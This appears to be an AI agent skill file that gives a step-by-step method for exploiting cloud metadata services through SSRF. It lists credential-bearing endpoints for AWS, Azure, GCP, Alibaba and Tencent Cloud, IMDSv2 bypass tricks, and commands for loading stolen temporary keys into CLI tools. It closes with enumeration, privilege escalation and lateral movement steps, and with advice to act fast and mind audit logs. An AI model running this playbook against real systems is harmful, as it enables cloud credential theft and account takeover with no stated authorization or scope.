---
name: cloud-metadata
description: "Cloud metadata exploitation. Use when an SSRF or an obtained shell can reach cloud instance metadata services. Covers metadata endpoints for AWS/Azure/GCP/Alibaba Cloud/Tencent Cloud, IAM/CAM credential extraction, IMDSv2 bypass, and the complete attack chain from metadata to cloud service enumeration. Should be used for any SSRF scenario and any situation where the internal network can reach 169.254.169.254 or 100.100.100.200"
zh-signals: "通过 SSRF 或已获取的 shell 访问云实例元数据服务，提取 AWS/Azure/GCP/阿里云/腾讯云的 IAM/CAM 临时凭据并进一步枚举云资源。信号:云元数据,SSRF,IAM,CAM,IMDS"
when-to-use: "Use when an SSRF or shell can reach cloud instance metadata services such as 169.254.169.254 or 100.100.100.200. Covers AWS/Azure/GCP/Alibaba/Tencent endpoints, credential extraction, and IMDSv2 bypass."
metadata:
  tags: "cloud,metadata,ssrf,iam,cam,aws,azure,gcp,aliyun,tencent,tencent-cloud,imds,cloud-security"
  category: "cloud"
---

# Cloud Metadata Exploitation Methodology

IMDS is the bridge from SSRF/RCE to the cloud control plane—a single HTTP request yields IAM/CAM temporary credentials.

## ⛔ Further Reading (Must Read)

- Detailed credential extraction commands for each cloud platform, quick AWS/Tencent Cloud exploitation, metadata information paths → [references/credential-extraction.md](references/credential-extraction.md)

---

## Phase 1: Confirm the Cloud Environment

| Indicator | Cloud Platform |
|------|--------|
| `x-amz-*` Header, `Server: AmazonS3` | AWS |
| `x-ms-*` Header, `.azurewebsites.net` | Azure |
| `.googleapis.com`, `x-goog-*` Header | GCP |
| `.aliyuncs.com`, `x-oss-*` Header | Alibaba Cloud |
| `.myqcloud.com`, `x-cos-*` Header, `Server: tencent-cos` | Tencent Cloud |

## Phase 2: Metadata Endpoint Quick Reference

```
# AWS (IMDSv1 — direct GET)
http://169.254.169.254/latest/meta-data/

# AWS (IMDSv2 — requires PUT to obtain a token)
PUT http://169.254.169.254/latest/api/token
  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Header: Metadata: true

# GCP
http://metadata.google.internal/computeMetadata/v1/
  Header: Metadata-Flavor: Google

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/

# Tencent Cloud (CVM/Lighthouse application server)
http://metadata.tencentyun.com/latest/meta-data/
# Can also be accessed via IP
http://169.254.0.23/latest/meta-data/
```

### Complete Tencent Cloud Metadata Paths

```
# Basic information
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/instance-id
http://metadata.tencentyun.com/latest/meta-data/uuid
http://metadata.tencentyun.com/latest/meta-data/hostname
http://metadata.tencentyun.com/latest/meta-data/local-ipv4
http://metadata.tencentyun.com/latest/meta-data/public-ipv4
http://metadata.tencentyun.com/latest/meta-data/instance-type

# Region information
http://metadata.tencentyun.com/latest/meta-data/placement/region
http://metadata.tencentyun.com/latest/meta-data/placement/zone

# Network (requires obtaining the MAC address first)
http://metadata.tencentyun.com/latest/meta-data/mac
http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/vpc-id
http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/subnet-id
http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/local-ipv4

# CAM role credentials (key attack surface!)
http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
# ↑ Lists the names of the mounted roles

http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<role-name>
# ↑ Returns temporary credentials: TmpSecretId, TmpSecretKey, Token, ExpiredTime

# User data (startup scripts — often contain passwords!)
http://metadata.tencentyun.com/latest/user-data
```

## Phase 3: SSRF → Metadata

- Use SSRF directly to request `http://169.254.169.254/...` (AWS/Azure/GCP)
- Use SSRF directly to request `http://metadata.tencentyun.com/...` (Tencent Cloud, via domain name)
- Use SSRF directly to request `http://100.100.100.200/...` (Alibaba Cloud)
- **IMDSv2 requires PUT + a custom Header** → most SSRF vectors cannot set headers, which is exactly the defensive value of IMDSv2
- Bypass: `http://[::ffff:169.254.169.254]/`, DNS rebinding, 302 redirect
- **Tencent Cloud and Alibaba Cloud metadata services require no special Header** (similar to IMDSv1, easier to exploit via SSRF)

## Phase 4: Credential Exploitation Decision Tree

```
Credentials obtained?
├─ AWS → export environment variables → aws sts get-caller-identity → enumerate S3/EC2/Lambda/Secrets
├─ Azure → Bearer Token → enumerate resources
├─ GCP → OAuth Token → enumerate project resources
├─ Alibaba Cloud → STS Token → enumerate OSS/ECS
└─ Tencent Cloud → configure tccli → enumerate COS/CVM/SCF/CAM
    ├─ tccli configure (interactive) or set environment variables
    ├─ tccli sts GetCallerIdentity (verify identity)
    ├─ coscli ls or Python SDK (list buckets; tccli does not support GetService)
    ├─ tccli cvm DescribeInstances (list instances)
    └─ → switch to the cloud-iam-audit skill for privilege escalation assessment
Detailed commands → [references/credential-extraction.md](references/credential-extraction.md)
```

### Quick Tencent Cloud Credential Configuration

```bash
# Method 1: tccli configure
tccli configure
# SecretId: TmpSecretId obtained from metadata
# SecretKey: TmpSecretKey obtained from metadata
# token: Token obtained from metadata
# Region: obtained from metadata placement/region

# Method 2: environment variables (suits scripting)
export TENCENTCLOUD_SECRET_ID="TmpSecretId"
export TENCENTCLOUD_SECRET_KEY="TmpSecretKey"
export TENCENTCLOUD_SESSION_TOKEN="Token"

# Verify
tccli sts GetCallerIdentity
```

After obtaining cloud credentials, perform IAM privilege escalation assessment.

## Notes
- **IMDSv2** is AWS's primary defense against metadata SSRF—pure SSRF is basically not exploitable
- **Tencent Cloud and Alibaba Cloud metadata do not enforce a token**, which lowers the bar for SSRF exploitation
- Cloud credentials expire (typically 6-12 hours); **exploit them immediately** once obtained
- Credential operations leave CloudTrail/CloudAudit logs; mind the operational traces
- **User-Data** (`/latest/user-data`) often contains passwords embedded in startup scripts
- The Tencent Cloud metadata domain `metadata.tencentyun.com` is only reachable from inside the instance's internal network

## Further Exploitation
- Once cloud credentials are obtained, perform lateral movement to access more cloud resources
- Tencent Cloud: credentials → enumerate COS with tccli/coscli → search sensitive data → CAM privilege escalation
- AWS: credentials → enumerate S3/EC2/Lambda with awscli → IAM privilege escalation
